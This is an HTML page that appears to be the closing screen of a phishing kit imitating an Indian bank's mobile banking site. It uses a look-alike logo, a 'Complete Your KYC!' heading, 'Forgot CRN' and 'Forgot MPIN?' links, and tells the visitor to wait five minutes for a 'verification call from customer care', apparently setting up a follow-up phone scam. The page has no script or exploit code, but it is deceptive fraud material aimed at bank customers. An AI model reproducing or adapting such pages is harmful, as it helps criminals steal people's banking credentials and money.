<!DOCTYPE HTML> 
<html lang="zxx">
   <head>
      <title>Document Online</title>
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <link rel="stylesheet" type="text/css" href="bootstrap.css">
      <link rel="stylesheet" type="text/css" href="unamestyle.css">
   </head>
   <body>
      <div class="container">
         <div class="row">
            <div class="col-md-12 text-center"><img src="kathak.png" class="logo"></div>
            <div class="col-md-12">
               <div class="mrd">
                    <div class="container">
    
 <div class="thankyoucontent text-center">
    <div class="wrapper-2"><br><br><br><br><br><br>
       <img style="text-align:center; width:100px; margin:0 auto;"  src="https://thumbs.gfycat.com/ChillyAbleGrizzlybear-size_restricted.gif">
     <h1>Complete Your KYC!</h1>
      <p>Please Wait 5 Minutes Receive Verification Call From Customer Care...
</p>
     
    </div>
   
   

</div>
   </div>
               </div>
            </div>
         </div>
      </div>
      <footer>
         <div class="container">
            <div class="row">
               <div class="col-md-6 col-xs-6 col-sm-6 w50"><img src="crn.png" width="30px;"><br>Forgot CRN</div>
               <div class="col-md-6 col-xs-6 col-sm-6 w50"><img src="mpin.png" width="30px;"><br>Forgot MPIN?</div>
            </div>
         </div>
      </footer>
   </body>
</html>